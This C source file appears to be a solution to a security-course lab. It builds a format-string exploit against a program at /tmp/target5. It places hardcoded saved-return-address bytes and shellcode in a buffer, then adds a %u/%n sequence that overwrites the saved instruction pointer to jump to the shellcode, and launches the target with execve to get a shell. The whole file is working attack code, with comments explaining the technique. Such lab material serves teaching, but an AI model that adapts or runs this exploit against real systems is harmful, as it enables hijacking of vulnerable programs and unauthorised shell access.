#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  /* Initialize payload */
  char payload[400];
  memset (payload, 1, sizeof payload);
  payload[399] = 0;

  /* Beginning of buf contains four <int, addr> pairs, where the
     ints are arbitrary and the addrs are four bytes of saved eip
     address (in ascending order). NB: third addr has no int in
     front, since a %nu isn't used --- just 4 chars handcoded. */
  char *addr_code = "\x12\x34\x56\x78\xac\xfc\xff\xbf\x12\x34\x56\x78\xad\xfc\xff\xbf\xae\xfc\xff\xbf\x12\x34\x56\x78\xaf\xfc\xff\xbf";
  unsigned addr_len = strlen (addr_code);
  unsigned shell_len = strlen (shellcode);

  /* Copy in the address pairs followed by the shellcode. */
  memcpy (payload, addr_code, addr_len);
  memcpy (payload + addr_len, shellcode, shell_len);

  /* The three %u's pop snprintf()'s internal stack to point at
     the written buf on the stack. Then, there are four %u%n pairs
     that write the address of the shell code onto the saved
     eip. Note that it takes forever to get this right. */
  char *write_code = "%u%u%u%220u%n%199u%n....%n%192u%n";
  unsigned write_len = strlen (write_code);
  memcpy (payload + addr_len + shell_len, write_code, write_len);

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
